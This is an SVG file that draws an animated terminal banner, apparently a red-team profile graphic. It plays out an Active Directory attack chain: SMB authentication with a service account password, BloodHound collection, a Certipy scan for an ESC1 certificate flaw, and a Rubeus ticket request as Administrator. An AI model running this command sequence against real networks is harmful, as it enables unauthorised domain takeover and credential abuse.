
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 310" font-family="'Fira Code', 'JetBrains Mono', 'Courier New', monospace">
  <defs>
    <style>
      .bg      { fill: #0D1117; }
      .header  { fill: #161B22; }
      .prompt  { fill: #DC143C; font-weight: 600; }
      .cmd     { fill: #E6EDF3; }
      .out     { fill: #8B949E; }
      .hit     { fill: #9D4EDD; font-weight: 600; }
      .ok      { fill: #3FB950; }
      .title   { fill: #6E7681; font-size: 11px; }

      .l1 { animation: show 14s infinite;  animation-delay: 0.3s;  opacity: 0; }
      .l2 { animation: show 14s infinite;  animation-delay: 1.8s;  opacity: 0; }
      .l3 { animation: show 14s infinite;  animation-delay: 3.3s;  opacity: 0; }
      .l4 { animation: show 14s infinite;  animation-delay: 4.8s;  opacity: 0; }
      .l5 { animation: show 14s infinite;  animation-delay: 6.3s;  opacity: 0; }
      .l6 { animation: show 14s infinite;  animation-delay: 7.8s;  opacity: 0; }
      .l7 { animation: show 14s infinite;  animation-delay: 9.3s;  opacity: 0; }
      .l8 { animation: show 14s infinite;  animation-delay: 10.8s; opacity: 0; }

      @keyframes show {
        0%   { opacity: 0; }
        3%   { opacity: 1; }
        92%  { opacity: 1; }
        100% { opacity: 0; }
      }

      .cursor { animation: blink 1.1s step-end infinite; fill: #DC143C; }
      @keyframes blink {
        0%, 50%   { opacity: 1; }
        51%, 100% { opacity: 0; }
      }
    </style>
  </defs>

  <!-- window -->
  <rect class="bg" width="500" height="310" rx="10"/>
  <rect class="header" width="500" height="28" rx="10"/>
  <rect class="header" y="18" width="500" height="10"/>
  <circle cx="16" cy="14" r="5" fill="#FF5F56"/>
  <circle cx="34" cy="14" r="5" fill="#FFBD2E"/>
  <circle cx="52" cy="14" r="5" fill="#27C93F"/>
  <text x="250" y="18" text-anchor="middle" class="title">blackc0rrre@ops : ~</text>

  <!-- lines -->
  <g font-size="12.5">
    <g class="l1">
      <text x="14" y="58"><tspan class="prompt">$</tspan><tspan class="cmd" dx="6">nxc smb 10.10.10.0/24 -u svc_sql -p 'Summer2025!'</tspan></text>
    </g>
    <g class="l2">
      <text x="14" y="80" class="out">SMB  10.10.10.15  445  DC01   [+] corp.local\svc_sql (Pwn3d!)</text>
    </g>

    <g class="l3">
      <text x="14" y="108"><tspan class="prompt">$</tspan><tspan class="cmd" dx="6">bloodhound-python -u svc_sql -p 'Summer2025!' -d corp.local -c all</tspan></text>
    </g>
    <g class="l4">
      <text x="14" y="130" class="out">[+] 412 users · 89 computers · 14 high-value targets collected</text>
    </g>

    <g class="l5">
      <text x="14" y="158"><tspan class="prompt">$</tspan><tspan class="cmd" dx="6">certipy find -u svc_sql@corp.local -p 'Summer2025!' -vulnerable</tspan></text>
    </g>
    <g class="l6">
      <text x="14" y="180"><tspan class="hit">[!]</tspan><tspan class="out" dx="4">ESC1 on CORP-CA\UserAuth → domain takeover path available</tspan></text>
    </g>

    <g class="l7">
      <text x="14" y="208"><tspan class="prompt">$</tspan><tspan class="cmd" dx="6">Rubeus.exe asktgt /user:Administrator /certificate:shadow.pfx</tspan></text>
    </g>
    <g class="l8">
      <text x="14" y="230"><tspan class="ok">[+]</tspan><tspan class="out" dx="4">TGT obtained for Administrator@corp.local</tspan></text>
    </g>
  </g>

  <!-- prompt + blinking cursor -->
  <g font-size="12.5">
    <text x="14" y="270" class="prompt">$</text>
    <rect class="cursor" x="26" y="259" width="8" height="14"/>
  </g>
</svg>
